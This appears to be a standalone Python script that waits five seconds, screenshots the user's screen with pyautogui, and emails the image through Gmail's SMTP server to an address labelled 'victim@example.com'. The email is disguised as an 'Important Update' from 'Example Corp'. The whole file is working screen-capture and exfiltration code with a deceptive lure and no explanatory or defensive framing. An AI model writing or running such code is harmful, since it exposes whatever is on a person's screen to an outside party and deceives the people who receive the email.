import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import os
import time
import pyautogui

# Function to send email with image attachment
def send_email(sender, recipient, subject, body, image_path):
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject

    body = MIMEText(body)
    msg.attach(body)

    with open(image_path, 'rb') as f:
        img_data = f.read()
    image = MIMEImage(img_data, name=os.path.basename(image_path))
    msg.attach(image)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender, 'password')
    server.sendmail(sender, recipient, msg.as_string())
    server.quit()

# Function to capture screenshot
def capture_screenshot(filename):
    time.sleep(5)  # Wait for 5 seconds
    pyautogui.screenshot(filename)

# Main function
def main():
    sender = 'example@gmail.com'
    recipient = 'victim@example.com'
    subject = 'Important Update'
    body = 'Hi there,\n\nPlease find attached a screenshot of the latest update.\n\nBest regards,\nExample Corp'
    image_path = 'screenshot.png'

    capture_screenshot(image_path)
    send_email(sender, recipient, subject, body, image_path)
    print('Email sent successfully')

if __name__ == '__main__':
    main()